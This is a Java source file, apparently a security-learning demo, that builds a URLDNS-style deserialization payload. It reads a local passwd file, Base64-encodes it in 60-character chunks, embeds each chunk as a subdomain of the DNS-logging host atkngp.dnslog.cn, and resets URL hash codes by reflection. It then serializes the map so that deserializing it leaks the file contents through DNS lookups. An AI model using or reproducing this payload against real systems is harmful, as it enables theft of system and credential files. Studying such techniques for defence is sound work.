package demo.urldns;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class DNSReadContent {
    public static void main(String[] args) throws Exception {
        ReadContent readContent = new ReadContent();
//        readContent.etcPasswd();
        readContent.etcPasswd();

    }
}

class ReadContent {

    public void etcPasswd() throws Exception {
        //byte[] 数组中存放的是字符串响应位置对应的字母的ascii
        //"Hello,world".getBytes()  byte 数组
//        String b64 = Base64.getEncoder().encodeToString("Hello,world".getBytes());
//        System.out.println("Hello,world".getBytes());
//        System.out.println(b64);
        //第一步，将文件内容转换成Base64编码
        FileInputStream fis = new FileInputStream("./data/linux.passwd");
        byte[] bytearray = new byte[fis.available()]; //获取IO字节流的大小
        fis.read(bytearray);     //读到bytearray 字节数组中
        String b64str = Base64.getEncoder().encodeToString(bytearray);
        System.out.println(b64str);

        //第二步，将文件内容按照每次60个字符进行序列化（域名最多63）
//        int counts = b64str.length() / 60; //循环次数
//        int chars = b64str.length() % 60; //余下的base64字符串

        //1种方式
//        String sixty = b64str.substring(0, 60); //取前60个字符
//        HashMap<URL, String> map = new HashMap<URL, String>();
//        URL url = new URL("http://" + sixty + ".atkngp.dnslog.cn");
//        map.put(url, "123");   //
//        //上面put后进行了序列化，有了一个hashcode值，所以下面需要将hashcode值设置为-1
//        Class clazz = Class.forName("java.net.URL");//反射调用URL类中的hashcode方法
//        Field hashcode = clazz.getDeclaredField("hashCode");
//        hashcode.setAccessible(true); //设置可写
//        hashcode.set(url, -1);//设置url的hashcode为-1，

        //第二种方式
        int counts = b64str.length() / 60;
        int chars = b64str.length() % 60;
        HashMap<URL, String> map = new HashMap<URL, String>();
        for (int i = 0; i < counts; i++) {
            String sixty = b64str.substring(60 * i, 60 * i + 60); //取前60个字符
            URL url = new URL("http://" + sixty + ".atkngp.dnslog.cn");
            map.put(url, "123");   //
        }
        for (URL key : map.keySet()) {
            System.out.println(key + map.get(key)); //通过键得到值
        }
        URL url = new URL("http://" + b64str.substring(counts*60) + ".atkngp.dnslog.cn");
        map.put(url,"123");

        //上面put后进行了序列化，有了一个hashcode值，所以下面需要将hashcode值设置为-1
        Class clazz = Class.forName("java.net.URL");//反射调用URL类中的hashcode方法
        Field hashcode = clazz.getDeclaredField("hashCode");
        hashcode.setAccessible(true); //设置可写
        hashcode.set(url, -1);//设置url的hashcode为-1，
        //hashMap遍历键值对的两种方式
        //1.
//        for (Map.Entry entry : map.entrySet()) {
//            System.out.println(entry.getKey()); //键
//            System.out.println(entry.getValue()); //值
//        }
//        //2.
//        for (URL key : map.keySet()) {
//            System.out.println(key + map.get(key)); //通过键得到值
//        }

        //将序列化后的数据写到urldns.passwd.ser文件中
        FileOutputStream fos = new FileOutputStream("./data/urldns.passwd.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map); //序列化1个map
    }

    public void unserializePasswd() throws Exception {
        //反序列化
        FileInputStream fis = new FileInputStream("./data/urldns.passwd.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }


}